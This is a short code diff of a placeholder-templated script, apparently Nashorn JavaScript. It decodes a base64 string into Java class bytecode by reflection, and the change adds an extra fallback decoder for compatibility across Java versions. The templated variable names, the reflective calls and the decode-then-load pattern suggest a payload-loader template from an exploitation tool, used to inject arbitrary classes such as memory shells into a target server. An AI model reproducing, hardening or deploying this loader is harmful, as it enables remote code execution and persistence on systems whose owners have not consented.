@@ -6,8 +6,13 @@ try {
     var {{VAR:decoder}} = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
     {{VAR:bytecode}} = {{VAR:decoder}}.getClass().getMethod("decode", {{VAR:clsString}}).invoke({{VAR:decoder}}, {{VAR:base64Str}});
 } catch ({{VAR:ee}}) {
-    var {{VAR:decoder}} = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
-    {{VAR:bytecode}} = {{VAR:decoder}}.getClass().getMethod("decodeBuffer", {{VAR:clsString}}).invoke({{VAR:decoder}}, {{VAR:base64Str}});
+    try {
+        var {{VAR:converter}} = java.lang.Class.forName("javax.xml.bind.DatatypeConverter");
+        {{VAR:bytecode}} = {{VAR:converter}}.getMethod("parseBase64Binary", {{VAR:clsString}}).invoke(null, {{VAR:base64Str}});
+    } catch ({{VAR:eee}}) {
+        var {{VAR:legacyDecoder}} = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
+        {{VAR:bytecode}} = {{VAR:legacyDecoder}}.getClass().getMethod("decodeBuffer", {{VAR:clsString}}).invoke({{VAR:legacyDecoder}}, {{VAR:base64Str}});
+    }
 }
 var {{VAR:clsByteArray}} = (new java.lang.String("").getBytes().getClass());
 var {{VAR:clsInt}} = java.lang.Integer.TYPE;
